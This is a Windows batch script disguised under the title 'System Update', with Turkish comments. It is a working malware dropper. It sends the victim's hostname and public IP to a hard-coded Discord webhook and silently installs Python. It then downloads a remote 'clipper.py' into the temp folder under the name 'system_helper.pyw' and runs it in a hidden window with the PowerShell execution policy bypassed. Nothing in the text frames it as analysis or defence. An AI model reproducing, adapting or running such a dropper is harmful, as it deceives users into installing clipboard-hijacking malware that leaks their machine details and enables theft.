@echo off
title System Update
chcp 65001 >nul
cd /d "%~dp0"

:: 1. Bilgi Toplama
for /f "tokens=*" %%a in ('hostname') do set "HOST=%%a"
for /f "tokens=*" %%b in ('curl -s https://api.ipify.org') do set "IP=%%b"

:: 2. Discord Bildirimi (Güvenli biçimlendirme)
set "MSG=**✅ Yeni baglanti!** Bilgisayar: %HOST% | IP: %IP% | Zaman: %DATE% %TIME%"
powershell -NoProfile -ExecutionPolicy Bypass -Command "$msg = [System.Web.HttpUtility]::UrlDecode('%MSG%'); $json = @{content='%MSG%'}; Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1514118771776688164/dKNF5PnIXuS8-ERE-c-JTWzOWl1U_bYZuVZ5yYCcqKAcCoPw6FqQi7S_MxrP7LMA1f-0' -Method Post -Body ($json | ConvertTo-Json) -ContentType 'application/json'" >nul 2>&1

:: 3. Python Kontrolü ve Dinamik Kurulum
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo Python bulunamadi, indiriliyor...
    curl -L -o "%TEMP%\py_setup.exe" https://www.python.org/ftp/python/3.12.3/python-3.12.3-amd64.exe
    start /wait "" "%TEMP%\py_setup.exe" /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
    timeout /t 15 /nobreak >nul
    del /f /q "%TEMP%\py_setup.exe"
)

:: 4. Clipper İndirme ve PATH Yenileyerek Çalıştırma
set "CLIPPER_URL=https://raw.githubusercontent.com/bilgi213h/hululu/main/clipper.py"
curl -L -o "%TEMP%\system_helper.pyw" "%CLIPPER_URL%"

:: PATH değişkenini mevcut oturumda yenilemek ve betiği çalıştırmak için PowerShell köprüsü kullanılır
powershell -NoProfile -ExecutionPolicy Bypass -Command "$env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path','User'); Start-Process pythonw -ArgumentList '$env:TEMP\system_helper.pyw' -WindowStyle Hidden"

exit
